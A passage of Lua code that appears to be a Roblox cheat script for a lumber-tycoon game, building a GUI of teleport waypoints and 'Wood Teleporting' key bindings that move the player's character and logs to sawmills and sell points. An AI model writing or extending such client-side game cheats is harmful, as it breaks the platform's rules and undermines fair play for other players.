part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
if pos.Position.Y < YP then
for High = pos.Position.Y,YP,YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
else
for High = pos.Position.Y,YP,-YTpEvery do
game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
local part = Instance.new("Part", workspace)
part.Anchored = true
part.Size = Vector3.new(10,0.1,10)
part.Material = "Glass"
part.BrickColor = BrickColor.Random()
part.Transparency = 0.7
part.Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
wait(Timer)
part.Destroy(part)
end
end
game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(XP + 5,YP,ZP + 5)
end
Teleport(268.4, 3.2, 52.1)
end)

InfoText300 = Instance.new("ImageLabel")
InfoText300.Name = "ImageLabel"
InfoText300.Parent = MainFrame
InfoText300.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText300.Position = UDim2.new(0, 195, 0, 180)
InfoText300.Size = UDim2.new(0, 200, 0, 100)
InfoText300.Image = "rbxassetid://4888990547"
InfoText300.Visible = false

WoodRUs.MouseEnter:connect(function()
InfoText300.Visible = true
end)

WoodRUs.MouseLeave:connect(function()
InfoText300.Visible = false
end)

LandStore = Instance.new("TextButton")
LandStore.Name = "LandStore"
LandStore.Parent = Waypoints
LandStore.BackgroundColor3 = Color3.new(0, 0, 0)
LandStore.BackgroundTransparency = 0.6
LandStore.BorderColor3 = Color3.fromRGB(151, 0, 0)
LandStore.Position = UDim2.new(0, 5, 0, 279)
LandStore.Size = UDim2.new(0, 148, 0, 20)
LandStore.Font = Enum.Font.Fantasy
LandStore.Text = "Land Store"
LandStore.TextColor3 = Color3.new(1, 1, 1)
LandStore.TextSize = 14
LandStore.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(261.3, 3.2, -102)
end)
InfoText301 = Instance.new("ImageLabel")
InfoText301.Name = "ImageLabel"
InfoText301.Parent = MainFrame
InfoText301.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText301.Position = UDim2.new(0, 185, 0, 180)
InfoText301.Size = UDim2.new(0, 200, 0, 100)
InfoText301.Image = "rbxassetid://4888991073"
InfoText301.Visible = false

LandStore.MouseEnter:connect(function()
InfoText301.Visible = true
end)

LandStore.MouseLeave:connect(function()
InfoText301.Visible = false
end)

FancyFurnishings = Instance.new("TextButton")
FancyFurnishings.Name = "FancyFurnishings"
FancyFurnishings.Parent = Waypoints
FancyFurnishings.BackgroundColor3 = Color3.new(0, 0, 0)
FancyFurnishings.BackgroundTransparency = 0.6
FancyFurnishings.BorderColor3 = Color3.fromRGB(151, 0, 0)
FancyFurnishings.Position = UDim2.new(0, 5, 0, 302)
FancyFurnishings.Size = UDim2.new(0, 148, 0, 20)
FancyFurnishings.Font = Enum.Font.Fantasy
FancyFurnishings.Text = "Fancy Furnishings"
FancyFurnishings.TextColor3 = Color3.new(1, 1, 1)
FancyFurnishings.TextSize = 14
FancyFurnishings.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(491, 13, -1720)
end)

InfoText41 = Instance.new("ImageLabel")
InfoText41.Name = "ImageLabel"
InfoText41.Parent = MainFrame
InfoText41.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText41.Position = UDim2.new(0, 185, 0, 180)
InfoText41.Size = UDim2.new(0, 200, 0, 100)
InfoText41.Image = "rbxassetid://4501662009"
InfoText41.Visible = false

FancyFurnishings.MouseEnter:connect(function()
InfoText41.Visible = true
end)

FancyFurnishings.MouseLeave:connect(function()
InfoText41.Visible = false
end)

LinksLogic = Instance.new("TextButton")
LinksLogic.Name = "LinksLogic"
LinksLogic.Parent = Waypoints
LinksLogic.BackgroundColor3 = Color3.new(0, 0, 0)
LinksLogic.BackgroundTransparency = 0.6
LinksLogic.BorderColor3 = Color3.fromRGB(151, 0, 0)
LinksLogic.Position = UDim2.new(0, 5, 0, 325)
LinksLogic.Size = UDim2.new(0, 148, 0, 20)
LinksLogic.Font = Enum.Font.Fantasy
LinksLogic.Text = "Link's Logic"
LinksLogic.TextColor3 = Color3.new(1, 1, 1)
LinksLogic.TextSize = 14
LinksLogic.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(4607, 9, -798)
end)

InfoText42 = Instance.new("ImageLabel")
InfoText42.Name = "ImageLabel"
InfoText42.Parent = MainFrame
InfoText42.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText42.Position = UDim2.new(0, 185, 0, 180)
InfoText42.Size = UDim2.new(0, 200, 0, 100)
InfoText42.Image = "rbxassetid://4501662249"
InfoText42.Visible = false

LinksLogic.MouseEnter:connect(function()
InfoText42.Visible = true
end)

LinksLogic.MouseLeave:connect(function()
InfoText42.Visible = false
end)

CarShop = Instance.new("TextButton")
CarShop.Name = "CarShop"
CarShop.Parent = Waypoints
CarShop.BackgroundColor3 = Color3.new(0, 0, 0)
CarShop.BackgroundTransparency = 0.6
CarShop.BorderColor3 = Color3.fromRGB(151, 0, 0)
CarShop.Position = UDim2.new(0, 5, 0, 348)
CarShop.Size = UDim2.new(0, 148, 0, 20)
CarShop.Font = Enum.Font.Fantasy
CarShop.Text = "Car Shop"
CarShop.TextColor3 = Color3.new(1, 1, 1)
CarShop.TextSize = 14
CarShop.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(508.5, 3.2, -1462.7)
end)

InfoText302 = Instance.new("ImageLabel")
InfoText302.Name = "ImageLabel"
InfoText302.Parent = MainFrame
InfoText302.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText302.Position = UDim2.new(0, 185, 0, 180)
InfoText302.Size = UDim2.new(0, 200, 0, 100)
InfoText302.Image = "rbxassetid://4888991616"
InfoText302.Visible = false

CarShop.MouseEnter:connect(function()
InfoText302.Visible = true
end)

CarShop.MouseLeave:connect(function()
InfoText302.Visible = false
end)

FineArtsShop = Instance.new("TextButton")
FineArtsShop.Name = "FineArtsShop"
FineArtsShop.Parent = Waypoints
FineArtsShop.BackgroundColor3 = Color3.new(0, 0, 0)
FineArtsShop.BackgroundTransparency = 0.6
FineArtsShop.BorderColor3 = Color3.fromRGB(151, 0, 0)
FineArtsShop.Position = UDim2.new(0, 5, 0, 371)
FineArtsShop.Size = UDim2.new(0, 148, 0, 20)
FineArtsShop.Font = Enum.Font.Fantasy
FineArtsShop.Text = "Fine Arts Shop"
FineArtsShop.TextColor3 = Color3.new(1, 1, 1)
FineArtsShop.TextSize = 14
FineArtsShop.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(5207, -156, 719)
end)

InfoText43 = Instance.new("ImageLabel")
InfoText43.Name = "ImageLabel"
InfoText43.Parent = MainFrame
InfoText43.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText43.Position = UDim2.new(0, 185, 0, 180)
InfoText43.Size = UDim2.new(0, 200, 0, 100)
InfoText43.Image = "rbxassetid://4501662486"
InfoText43.Visible = false

FineArtsShop.MouseEnter:connect(function()
InfoText43.Visible = true
end)

FineArtsShop.MouseLeave:connect(function()
InfoText43.Visible = false
end)

BobsShack = Instance.new("TextButton")
BobsShack.Name = "BobsShack"
BobsShack.Parent = Waypoints
BobsShack.BackgroundColor3 = Color3.new(0, 0, 0)
BobsShack.BackgroundTransparency = 0.6
BobsShack.BorderColor3 = Color3.fromRGB(151, 0, 0)
BobsShack.Position = UDim2.new(0, 5, 0, 394)
BobsShack.Size = UDim2.new(0, 148, 0, 20)
BobsShack.Font = Enum.Font.Fantasy
BobsShack.Text = "Bob's Shack"
BobsShack.TextColor3 = Color3.new(1, 1, 1)
BobsShack.TextSize = 14
BobsShack.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(260, 10, -2542)
end)

InfoText44 = Instance.new("ImageLabel")
InfoText44.Name = "ImageLabel"
InfoText44.Parent = MainFrame
InfoText44.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText44.Position = UDim2.new(0, 185, 0, 180)
InfoText44.Size = UDim2.new(0, 200, 0, 100)
InfoText44.Image = "rbxassetid://4501661381"
InfoText44.Visible = false

BobsShack.MouseEnter:connect(function()
InfoText44.Visible = true
end)

BobsShack.MouseLeave:connect(function()
InfoText44.Visible = false
end)

LandMarkTitle = Instance.new("TextLabel")
LandMarkTitle.Name = "LandMarkTitle"
LandMarkTitle.Parent = Waypoints
LandMarkTitle.BackgroundColor3 = Color3.new(255, 0, 0)
LandMarkTitle.BorderColor3 = Color3.fromRGB(151, 0, 0)
LandMarkTitle.Position = UDim2.new(0, 5, 0, 417)
LandMarkTitle.Size = UDim2.new(0, 148, 0, 20)
LandMarkTitle.Font = Enum.Font.Fantasy
LandMarkTitle.Text = "-- LandMark --"
LandMarkTitle.TextColor3 = Color3.new(1, 1, 1)
LandMarkTitle.TextSize = 14

TheDen = Instance.new("TextButton")
TheDen.Name = "TheDen"
TheDen.Parent = Waypoints
TheDen.BackgroundColor3 = Color3.new(0, 0, 0)
TheDen.BackgroundTransparency = 0.6
TheDen.BorderColor3 = Color3.fromRGB(151, 0, 0)
TheDen.Position = UDim2.new(0, 5, 0, 440)
TheDen.Size = UDim2.new(0, 148, 0, 20)
TheDen.Font = Enum.Font.Fantasy
TheDen.Text = "The Den"
TheDen.TextColor3 = Color3.new(1, 1, 1)
TheDen.TextSize = 14
TheDen.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(323, 49, 1930)
end)

InfoText45 = Instance.new("ImageLabel")
InfoText45.Name = "ImageLabel"
InfoText45.Parent = MainFrame
InfoText45.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText45.Position = UDim2.new(0, 185, 0, 180)
InfoText45.Size = UDim2.new(0, 200, 0, 100)
InfoText45.Image = "rbxassetid://4501663748"
InfoText45.Visible = false

TheDen.MouseEnter:connect(function()
InfoText45.Visible = true
end)

TheDen.MouseLeave:connect(function()
InfoText45.Visible = false
end)

ShrineOfSight = Instance.new("TextButton")
ShrineOfSight.Name = "ShrineOfSight"
ShrineOfSight.Parent = Waypoints
ShrineOfSight.BackgroundColor3 = Color3.new(0, 0, 0)
ShrineOfSight.BackgroundTransparency = 0.6
ShrineOfSight.BorderColor3 = Color3.fromRGB(151, 0, 0)
ShrineOfSight.Position = UDim2.new(0, 5, 0, 463)
ShrineOfSight.Size = UDim2.new(0, 148, 0, 20)
ShrineOfSight.Font = Enum.Font.Fantasy
ShrineOfSight.Text = "Shrine Of Sight"
ShrineOfSight.TextColor3 = Color3.new(1, 1, 1)
ShrineOfSight.TextSize = 14
ShrineOfSight.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(-1600, 205, 919)
end)

InfoText46 = Instance.new("ImageLabel")
InfoText46.Name = "ImageLabel"
InfoText46.Parent = MainFrame
InfoText46.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText46.Position = UDim2.new(0, 185, 0, 180)
InfoText46.Size = UDim2.new(0, 200, 0, 100)
InfoText46.Image = "rbxassetid://4501662859"
InfoText46.Visible = false

ShrineOfSight.MouseEnter:connect(function()
InfoText46.Visible = true
end)

ShrineOfSight.MouseLeave:connect(function()
InfoText46.Visible = false
end)

SkiLodge = Instance.new("TextButton")
SkiLodge.Name = "Ski Lodge"
SkiLodge.Parent = Waypoints
SkiLodge.BackgroundColor3 = Color3.new(0, 0, 0)
SkiLodge.BackgroundTransparency = 0.6
SkiLodge.BorderColor3 = Color3.fromRGB(151, 0, 0)
SkiLodge.Position = UDim2.new(0, 5, 0, 486)
SkiLodge.Size = UDim2.new(0, 148, 0, 20)
SkiLodge.Font = Enum.Font.Fantasy
SkiLodge.Text = "Ski Lodge"
SkiLodge.TextColor3 = Color3.new(1, 1, 1)
SkiLodge.TextSize = 14
SkiLodge.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(1244, 66, 2306)
end)

InfoText47 = Instance.new("ImageLabel")
InfoText47.Name = "ImageLabel"
InfoText47.Parent = MainFrame
InfoText47.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText47.Position = UDim2.new(0, 185, 0, 180)
InfoText47.Size = UDim2.new(0, 200, 0, 100)
InfoText47.Image = "rbxassetid://4501663012"
InfoText47.Visible = false

SkiLodge.MouseEnter:connect(function()
InfoText47.Visible = true
end)

SkiLodge.MouseLeave:connect(function()
InfoText47.Visible = false
end)

Dock = Instance.new("TextButton")
Dock.Name = "Dock"
Dock.Parent = Waypoints
Dock.BackgroundColor3 = Color3.new(0, 0, 0)
Dock.BackgroundTransparency = 0.6
Dock.BorderColor3 = Color3.fromRGB(151, 0, 0)
Dock.Position = UDim2.new(0, 5, 0, 509)
Dock.Size = UDim2.new(0, 148, 0, 20)
Dock.Font = Enum.Font.Fantasy
Dock.Text = "Dock"
Dock.TextColor3 = Color3.new(1, 1, 1)
Dock.TextSize = 14
Dock.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(1114, 3.2, -197)
end)

InfoText48 = Instance.new("ImageLabel")
InfoText48.Name = "ImageLabel"
InfoText48.Parent = MainFrame
InfoText48.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText48.Position = UDim2.new(0, 185, 0, 180)
InfoText48.Size = UDim2.new(0, 200, 0, 100)
InfoText48.Image = "rbxassetid://4501661826"
InfoText48.Visible = false

Dock.MouseEnter:connect(function()
InfoText48.Visible = true
end)

Dock.MouseLeave:connect(function()
InfoText48.Visible = false
end)

Bridge = Instance.new("TextButton")
Bridge.Name = "Bridge"
Bridge.Parent = Waypoints
Bridge.BackgroundColor3 = Color3.new(0, 0, 0)
Bridge.BackgroundTransparency = 0.6
Bridge.BorderColor3 = Color3.fromRGB(151, 0, 0)
Bridge.Position = UDim2.new(0, 5, 0, 532)
Bridge.Size = UDim2.new(0, 148, 0, 20)
Bridge.Font = Enum.Font.Fantasy
Bridge.Text = "Bridge"
Bridge.TextColor3 = Color3.new(1, 1, 1)
Bridge.TextSize = 14
Bridge.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(113, 15, -977)
end)

InfoText49 = Instance.new("ImageLabel")
InfoText49.Name = "ImageLabel"
InfoText49.Parent = MainFrame
InfoText49.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText49.Position = UDim2.new(0, 185, 0, 180)
InfoText49.Size = UDim2.new(0, 200, 0, 100)
InfoText49.Image = "rbxassetid://4501661623"
InfoText49.Visible = false

Bridge.MouseEnter:connect(function()
InfoText49.Visible = true
end)

Bridge.MouseLeave:connect(function()
InfoText49.Visible = false
end)

Stranger = Instance.new("TextButton")
Stranger.Name = "Stranger"
Stranger.Parent = Waypoints
Stranger.BackgroundColor3 = Color3.new(0, 0, 0)
Stranger.BackgroundTransparency = 0.6
Stranger.BorderColor3 = Color3.fromRGB(151, 0, 0)
Stranger.Position = UDim2.new(0, 5, 0, 555)
Stranger.Size = UDim2.new(0, 148, 0, 20)
Stranger.Font = Enum.Font.Fantasy
Stranger.Text = "Stranger"
Stranger.TextColor3 = Color3.new(1, 1, 1)
Stranger.TextSize = 14
Stranger.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(1061, 20, 1131)
end)

InfoText50 = Instance.new("ImageLabel")
InfoText50.Name = "ImageLabel"
InfoText50.Parent = MainFrame
InfoText50.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText50.Position = UDim2.new(0, 185, 0, 180)
InfoText50.Size = UDim2.new(0, 200, 0, 100)
InfoText50.Image = "rbxassetid://4501663440"
InfoText50.Visible = false

Stranger.MouseEnter:connect(function()
InfoText50.Visible = true
end)

Stranger.MouseLeave:connect(function()
InfoText50.Visible = false
end)

VolcanoWin = Instance.new("TextButton")
VolcanoWin.Name = "VolcanoWin"
VolcanoWin.Parent = Waypoints
VolcanoWin.BackgroundColor3 = Color3.new(0, 0, 0)
VolcanoWin.BackgroundTransparency = 0.6
VolcanoWin.BorderColor3 = Color3.fromRGB(151, 0, 0)
VolcanoWin.Position = UDim2.new(0, 5, 0, 578)
VolcanoWin.Size = UDim2.new(0, 148, 0, 20)
VolcanoWin.Font = Enum.Font.Fantasy
VolcanoWin.Text = "Volcano Win"
VolcanoWin.TextColor3 = Color3.new(1, 1, 1)
VolcanoWin.TextSize = 14
VolcanoWin.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(-1675, 358, 1476)
end)

InfoText51 = Instance.new("ImageLabel")
InfoText51.Name = "ImageLabel"
InfoText51.Parent = MainFrame
InfoText51.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText51.Position = UDim2.new(0, 185, 0, 180)
InfoText51.Size = UDim2.new(0, 200, 0, 100)
InfoText51.Image = "rbxassetid://4501663922"
InfoText51.Visible = false

VolcanoWin.MouseEnter:connect(function()
InfoText51.Visible = true
end)

VolcanoWin.MouseLeave:connect(function()
InfoText51.Visible = false
end)

LightHouse = Instance.new("TextButton")
LightHouse.Name = "LightHouse"
LightHouse.Parent = Waypoints
LightHouse.BackgroundColor3 = Color3.new(0, 0, 0)
LightHouse.BackgroundTransparency = 0.6
LightHouse.BorderColor3 = Color3.fromRGB(151, 0, 0)
LightHouse.Position = UDim2.new(0, 5, 0, 601)
LightHouse.Size = UDim2.new(0, 148, 0, 20)
LightHouse.Font = Enum.Font.Fantasy
LightHouse.Text = "Light House"
LightHouse.TextColor3 = Color3.new(1, 1, 1)
LightHouse.TextSize = 14
LightHouse.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(1464.8, 356.3, 3257.2)
end)

InfoText303 = Instance.new("ImageLabel")
InfoText303.Name = "ImageLabel"
InfoText303.Parent = MainFrame
InfoText303.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText303.Position = UDim2.new(0, 185, 0, 180)
InfoText303.Size = UDim2.new(0, 200, 0, 100)
InfoText303.Image = "rbxassetid://4888992042"
InfoText303.Visible = false

LightHouse.MouseEnter:connect(function()
InfoText303.Visible = true
end)

LightHouse.MouseLeave:connect(function()
InfoText303.Visible = false
end)

BirdAxeCave = Instance.new("TextButton")
BirdAxeCave.Name = "BirdAxeCave"
BirdAxeCave.Parent = Waypoints
BirdAxeCave.BackgroundColor3 = Color3.new(0, 0, 0)
BirdAxeCave.BackgroundTransparency = 0.6
BirdAxeCave.BorderColor3 = Color3.fromRGB(151, 0, 0)
BirdAxeCave.Position = UDim2.new(0, 5, 0, 624)
BirdAxeCave.Size = UDim2.new(0, 148, 0, 20)
BirdAxeCave.Font = Enum.Font.Fantasy
BirdAxeCave.Text = "BirdAxe Cave"
BirdAxeCave.TextColor3 = Color3.new(1, 1, 1)
BirdAxeCave.TextSize = 14
BirdAxeCave.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
Teleport(4813.1, 33.5, -978.8)
end)

InfoText304 = Instance.new("ImageLabel")
InfoText304.Name = "ImageLabel"
InfoText304.Parent = MainFrame
InfoText304.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText304.Position = UDim2.new(0, 185, 0, 180)
InfoText304.Size = UDim2.new(0, 200, 0, 100)
InfoText304.Image = "rbxassetid://4888989871"
InfoText304.Visible = false

BirdAxeCave.MouseEnter:connect(function()
InfoText304.Visible = true
end)

BirdAxeCave.MouseLeave:connect(function()
InfoText304.Visible = false
end)

Woodmenu = Instance.new("ImageButton")
Woodmenu.Name = "Woodmenu"
Woodmenu.Parent = Picker
Woodmenu.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
Woodmenu.BorderColor3 = Color3.new(0, 0, 0)
Woodmenu.Position = UDim2.new(0, 15, 0, 175)
Woodmenu.Size = UDim2.new(0, 80, 0, 80)
Woodmenu.ZIndex = 3
Woodmenu.Image = "rbxassetid://4892951833"
Woodmenu.ScaleType = Enum.ScaleType.Crop
Woodmenu.MouseButton1Click:Connect(function()
CurrentItem.Image = "rbxassetid://4892951833"
  makesound("rbxassetid://156785206")
AIntroImage.Visible = false
AIntroImage1.Visible = false
AIntroImage2.Visible = false
AIntroImage3.Visible = false
TimesFrame.Visible = false
end)

WoodFrame = Instance.new("Frame")
WoodFrame.Name = "WoodFrame"
WoodFrame.Parent = MenuFrame
WoodFrame.BorderSizePixel = 1
WoodFrame.BackgroundTransparency = 0.5
WoodFrame.BorderColor3 = Color3.new(0, 0, 0)
WoodFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
WoodFrame.Size = UDim2.new(0, 380, 0, 460)
WoodFrame.Visible = false

Hel = Instance.new("TextButton")
Hel.Name = "Hel"
Hel.Parent = WoodFrame
Hel.BackgroundColor3 = Color3.new(0, 0, 0)
Hel.BackgroundTransparency = 0
Hel.BorderColor3 = Color3.new(1, 0, 0)
Hel.BorderSizePixel = 0
Hel.Position = UDim2.new(0, 158, 0, 5)
Hel.Size = UDim2.new(0, 30, 0, 20)
Hel.Font = Enum.Font.Fantasy
Hel.Text = "Help"
Hel.TextColor3 = Color3.fromRGB(245, 205, 48)
Hel.TextSize = 14

InfoText21 = Instance.new("TextLabel")
InfoText21.Name = "InfoText2"
InfoText21.Parent = MainFrame
InfoText21.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InfoText21.BorderColor3 = Color3.new(0, 0, 0)
InfoText21.BackgroundTransparency = 0
InfoText21.Position = UDim2.new(0, 28, 0, 330)
InfoText21.Size = UDim2.new(0, 150, 0, 150)
InfoText21.TextColor3 = Color3.fromRGB(245, 205, 48)
InfoText21.Font = Enum.Font.Fantasy
InfoText21.Text =  "Wood to Saw\n\n1.Cut Trees, it will not do Fully Grown Trees.\n2.PRESS (q), Then With your mouse Click your Sawmill.\n3.PRESS (e) on keyboard, With your mouse Click a piece of wood."
InfoText21.TextSize = 14
InfoText21.TextWrapped = true
InfoText21.Visible = false

Hel.MouseEnter:connect(function()
InfoText21.Visible = true
end)

Hel.MouseLeave:connect(function()
InfoText21.Visible = false
end)

WoodTitle = Instance.new("TextLabel")
WoodTitle.Name = "WoodTitle"
WoodTitle.Parent = WoodFrame
WoodTitle.BackgroundColor3 = Color3.new(255, 0, 0)
WoodTitle.BackgroundTransparency = 0
WoodTitle.BorderSizePixel = 0
WoodTitle.Position = UDim2.new(0, 5, 0, 5)
WoodTitle.Size = UDim2.new(0, 150, 0, 20)
WoodTitle.Font = Enum.Font.Fantasy
WoodTitle.Text = "Wood Teleporting"
WoodTitle.TextColor3 = Color3.new(1, 1, 1)
WoodTitle.TextSize = 14

ToSawmillTitle = Instance.new("TextLabel")
ToSawmillTitle.Name = "ToSawmillTitle"
ToSawmillTitle.Parent = WoodFrame
ToSawmillTitle.BackgroundColor3 = Color3.new(0, 0, 0)
ToSawmillTitle.BackgroundTransparency = 1
ToSawmillTitle.BorderColor3 = Color3.new(1, 0, 0)
ToSawmillTitle.Position = UDim2.new(0, 5, 0, 25)
ToSawmillTitle.Size = UDim2.new(0, 150, 0, 20)
ToSawmillTitle.Font = Enum.Font.Fantasy
ToSawmillTitle.Text = "-- Teleport To Sawmill --"
ToSawmillTitle.TextColor3 = Color3.new(0, 1, 0)
ToSawmillTitle.TextSize = 14

SawmillTitle = Instance.new("TextLabel")
SawmillTitle.Name = "SawmillTitle"
SawmillTitle.Parent = WoodFrame
SawmillTitle.BackgroundColor3 = Color3.new(0, 0, 0)
SawmillTitle.BorderColor3 = Color3.new(1, 0, 0)
SawmillTitle.BackgroundTransparency = 0.69999998807907
SawmillTitle.Position = UDim2.new(0, 5, 0, 48)
SawmillTitle.Size = UDim2.new(0, 65, 0, 20)
SawmillTitle.Font = Enum.Font.Fantasy
SawmillTitle.Text = "Sawmill:"
SawmillTitle.TextColor3 = Color3.new(1, 1, 1)
SawmillTitle.TextSize = 14

SawmillSetTitle = Instance.new("TextLabel")
SawmillSetTitle.Name = "SawmillSetTitle"
SawmillSetTitle.Parent = WoodFrame
SawmillSetTitle.BackgroundColor3 = Color3.new(0, 0, 0)
SawmillSetTitle.BackgroundTransparency = 0.69999998807907
SawmillSetTitle.BorderColor3 = Color3.new(1, 0, 0)
SawmillSetTitle.Position = UDim2.new(0, 75, 0, 48)
SawmillSetTitle.Size = UDim2.new(0, 80, 0, 20)
SawmillSetTitle.Font = Enum.Font.Fantasy
SawmillSetTitle.Text = "Not Selected"
SawmillSetTitle.TextColor3 = Color3.new(0, 1, 0)
SawmillSetTitle.TextSize = 14

KeybindingsTitle = Instance.new("TextLabel")
KeybindingsTitle.Name = "KeybindingsTitle"
KeybindingsTitle.Parent = WoodFrame
KeybindingsTitle.BackgroundColor3 = Color3.new(1, 0, 0)
KeybindingsTitle.BackgroundTransparency = 1
KeybindingsTitle.BorderColor3 = Color3.new(1, 0, 0)
KeybindingsTitle.Position = UDim2.new(0, 5, 0, 71)
KeybindingsTitle.Size = UDim2.new(0, 150, 0, 20)
KeybindingsTitle.Font = Enum.Font.Fantasy
KeybindingsTitle.Text = "-- Key Bindings --"
KeybindingsTitle.TextColor3 = Color3.new(0, 1, 0)
KeybindingsTitle.TextSize = 14

SetSawmillKey = Instance.new("TextButton")
SetSawmillKey.Name = "SetSawmillKey"
SetSawmillKey.Parent = WoodFrame
SetSawmillKey.BackgroundColor3 = Color3.new(0, 0, 0)
SetSawmillKey.BorderColor3 = Color3.new(1, 0, 0)
SetSawmillKey.BackgroundTransparency = 0.69999998807907
SetSawmillKey.Position = UDim2.new(0, 5, 0, 93)
SetSawmillKey.Size = UDim2.new(0, 125, 0, 20)
SetSawmillKey.Font = Enum.Font.Fantasy
SetSawmillKey.Text = "Sawmill Select Key"
SetSawmillKey.TextColor3 = Color3.new(1, 1, 1)
SetSawmillKey.TextSize = 14

SetSawTPKey = Instance.new("TextButton")
SetSawTPKey.Name = "SetSawTPKey"
SetSawTPKey.Parent = WoodFrame
SetSawTPKey.BackgroundColor3 = Color3.new(0, 0, 0)
SetSawTPKey.BorderColor3 = Color3.new(1, 0, 0)
SetSawTPKey.BackgroundTransparency = 0.69999998807907
SetSawTPKey.Position = UDim2.new(0, 5, 0, 116)
SetSawTPKey.Size = UDim2.new(0, 125, 0, 20)
SetSawTPKey.Font = Enum.Font.Fantasy
SetSawTPKey.Text = "Wood To Mill Key"
SetSawTPKey.TextColor3 = Color3.new(1, 1, 1)
SetSawTPKey.TextSize = 14

SetSellTPKey = Instance.new("TextButton")
SetSellTPKey.Name = "SetSellTPKey"
SetSellTPKey.Parent = WoodFrame
SetSellTPKey.BackgroundColor3 = Color3.new(0, 0, 0)
SetSellTPKey.BorderColor3 = Color3.new(1, 0, 0)
SetSellTPKey.BackgroundTransparency = 0.69999998807907
SetSellTPKey.Position = UDim2.new(0, 5, 0, 139)
SetSellTPKey.Size = UDim2.new(0, 125, 0, 20)
SetSellTPKey.Font = Enum.Font.Fantasy
SetSellTPKey.Text = "Sell Wood Key"
SetSellTPKey.TextColor3 = Color3.new(1, 1, 1)
SetSellTPKey.TextSize = 14

SetSawBox = Instance.new("TextBox")
SetSawBox.Name = "SetSawBox"
SetSawBox.Parent = WoodFrame
SetSawBox.BackgroundColor3 = Color3.new(0, 0, 0)
SetSawBox.BorderColor3 = Color3.new(1, 0, 0)
SetSawBox.BackgroundTransparency = 0.69999998807907
SetSawBox.Position = UDim2.new(0, 135, 0, 93)
SetSawBox.Size = UDim2.new(0, 30, 0, 20)
SetSawBox.Font = Enum.Font.Fantasy
SetSawBox.Text = "q"
SetSawBox.TextColor3 = Color3.new(1, 1, 1)
SetSawBox.TextSize = 14

SawTPBox = Instance.new("TextBox")
SawTPBox.Name = "SawTPBox"
SawTPBox.Parent = WoodFrame
SawTPBox.BackgroundColor3 = Color3.new(0, 0, 0)
SawTPBox.BackgroundTransparency = 0.69999998807907
SawTPBox.BorderColor3 = Color3.new(1, 0, 0)
SawTPBox.Position = UDim2.new(0, 135, 0, 116)
SawTPBox.Size = UDim2.new(0, 30, 0, 20)
SawTPBox.Font = Enum.Font.Fantasy
SawTPBox.Text = "e"
SawTPBox.TextColor3 = Color3.new(1, 1, 1)
SawTPBox.TextSize = 14

SellWoodBox = Instance.new("TextBox")
SellWoodBox.Name = "SellWoodBox"
SellWoodBox.Parent = WoodFrame
SellWoodBox.BackgroundColor3 = Color3.new(0, 0, 0)
SellWoodBox.BackgroundTransparency = 0.69999998807907
SellWoodBox.BorderColor3 = Color3.new(1, 0, 0)
SellWoodBox.Position = UDim2.new(0, 135, 0, 139)
SellWoodBox.Size = UDim2.new(0, 30, 0, 20)
SellWoodBox.Font = Enum.Font.Fantasy
SellWoodBox.Text = "r"
SellWoodBox.TextColor3 = Color3.new(1, 1, 1)
SellWoodBox.TextSize = 14

TreeHeader = Instance.new("TextLabel")
TreeHeader.Name = "TreeHeader"
TreeHeader.Parent = WoodFrame
TreeHeader.BackgroundColor3 = Color3.new(255, 0, 0)
TreeHeader.BackgroundTransparency = 0
TreeHeader.BorderColor3 = Color3.fromRGB(196, 40, 28)
TreeHeader.Position = UDim2.new(0, 215, 0, 5)
TreeHeader.Size = UDim2.new(0, 100, 0, 20)
TreeHeader.Font = Enum.Font.Fantasy
TreeHeader.Text = "Bring Trees"
TreeHeader.TextColor3 = Color3.new(1, 1, 1)
TreeHeader.TextSize = 14


InfoText25 = Instance.new("TextLabel")
InfoText25.Name = "InfoText2"
InfoText25.Parent = MainFrame
